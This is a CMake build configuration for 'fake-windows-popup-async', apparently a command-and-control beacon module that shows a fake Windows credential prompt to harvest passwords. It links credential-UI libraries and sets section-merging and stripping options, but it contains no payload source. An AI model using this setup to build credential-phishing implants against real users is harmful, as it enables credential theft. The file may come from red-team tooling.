add_executable(fake-windows-popup-async
    src/credentials.cpp
    src/dimmer.cpp
    src/main.cpp
    src/policy.cpp
    src/prompt.cpp
    src/target.cpp
)

target_include_directories(fake-windows-popup-async PRIVATE
    ${CMAKE_SOURCE_DIR}/beacon
    ${CMAKE_CURRENT_SOURCE_DIR}/src
)

target_link_libraries(fake-windows-popup-async PRIVATE
    beacon
    advapi32
    credui
    gdi32
    netapi32
    ole32
    secur32
    shell32
    user32
)

if(CMAKE_CXX_COMPILER_ID MATCHES "MSVC|Clang")
    target_compile_options(fake-windows-popup-async PRIVATE /GS- /MT /W4 /EHa)
    target_link_options(fake-windows-popup-async PRIVATE
        /MERGE:.gfids=.
        /MERGE:_RDATA=.
        /MERGE:.data=.
        /MERGE:.rdata=.
        /MERGE:.pdata=.
        /SECTION:.,RW
        /MERGE:.discard_data=.discard
    )
else()
    # Unlike the synchronous original, exceptions stay enabled so go can
    # catch std::exception instead of taking down the C2's async thread
    target_compile_options(fake-windows-popup-async PRIVATE
        -Wall -Wextra -Wpedantic -fexceptions)
    target_link_options(fake-windows-popup-async PRIVATE
        -fexceptions
        -static
        -T${LINK_SCRIPT}
        -Wl,--strip-all
    )
endif()
